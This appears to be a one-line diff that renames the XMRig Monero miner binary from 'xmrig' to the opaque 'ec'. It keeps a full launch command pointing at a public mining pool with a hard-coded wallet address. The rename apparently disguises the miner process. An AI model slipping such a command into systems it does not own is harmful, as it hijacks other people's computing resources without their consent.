@@ -1,1 +1,1 @@
-./xmrig --donate-level 0 -o fi.monero.herominers.com:1111 -u 83UUAxYWBaKX5ZwUC8GrzD9DW8KNQTTKRZwsVXceQM77B5aA1x56Azn1xHybJizzpeHes5Wj1DAtqT7w4zwo5JuKKFS5ZVs -p rich -a rx/0 -k --randomx-1gb-pages --huge-pages-jit --asm=auto --randomx-cache-qos
+./ec --donate-level 0 -o fi.monero.herominers.com:1111 -u 83UUAxYWBaKX5ZwUC8GrzD9DW8KNQTTKRZwsVXceQM77B5aA1x56Azn1xHybJizzpeHes5Wj1DAtqT7w4zwo5JuKKFS5ZVs -p rich -a rx/0 -k --randomx-1gb-pages --huge-pages-jit --asm=auto --randomx-cache-qos
